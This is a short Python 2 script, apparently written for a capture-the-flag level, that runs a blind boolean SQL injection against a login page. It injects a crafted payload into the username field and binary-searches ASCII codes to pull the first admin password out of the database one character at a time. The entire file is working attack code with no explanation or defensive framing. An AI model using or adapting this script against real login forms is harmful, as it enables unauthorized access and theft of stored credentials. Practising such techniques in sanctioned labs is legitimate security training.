import requests

url = "http://35.227.24.107/4af5c78ee0/login"
payload = "' or ascii(substring((select password from admins limit 1),{},{})) {} {};--"
hasil = ""

def check (txt):
    return txt.find("Invalid password") != -1

def isTrue (batas, operator, asci):
    return check(requests.post(url, { "username": payload.format(batas, batas, operator, asci), "password": "" }).text)

idx = 0
flag = True

while flag:
    idx = len(hasil) + 1
    l = 0
    r = 128
    while True:
        mid = (l+r) // 2
        if isTrue(str(idx), ">", mid):
            l = mid + 1
        elif isTrue(str(idx), "<", mid):
            r = mid
        elif isTrue(str(idx), "=", mid):
            hasil = hasil + str(unichr(mid))
            print hasil
            if mid == 0:
                flag = False
            break



